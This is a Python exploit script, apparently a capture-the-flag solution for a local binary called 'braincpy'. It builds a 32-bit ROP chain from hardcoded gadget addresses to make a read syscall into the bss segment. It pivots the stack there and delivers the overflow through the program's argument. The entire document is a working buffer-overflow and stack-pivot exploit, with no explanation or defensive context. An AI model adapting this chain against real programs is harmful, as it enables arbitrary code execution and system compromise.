import os
import struct

def p(a):return struct.pack("<I",a)
def u(a):return struct.unpack("<I",a)[0]

ebp    = p(0x08086C1C-0x0a)
ret    = p(0x080df815)
bss    = p(0x080e5c60+0x20)
leave  = p(0x080481d1)
popebp = p(0x080483a8)


#READ(0,bss,12345678)
ROP = ""
ROP += p(0x0805ae15) #pop edx ; pop ecx ; pop ebx ; ret
ROP += p(0x12345678) # -> edx
ROP += bss           # -> ecx
ROP += p(0xffffffff) # -> ebx
ROP += p(0x0805d9c3) # inc ebx
ROP += p(0x08054e90) # xor eax, eax
ROP += p(0x080998d2) # inc eax
ROP += p(0x080998d2) # inc eax
ROP += p(0x080998d2) # inc eax
ROP += p(0x0805b5c0) # int 0x80


PIVOT2 = ROP + popebp + bss + leave
BUF    = "A"*(0x58-len(PIVOT2))
PIVOT1 = ebp + ret

ARG1 = PIVOT2 + BUF + PIVOT1 

ARG=["./braincpy",ARG1]

os.execl("./braincpy","./braincpy",ARG1)
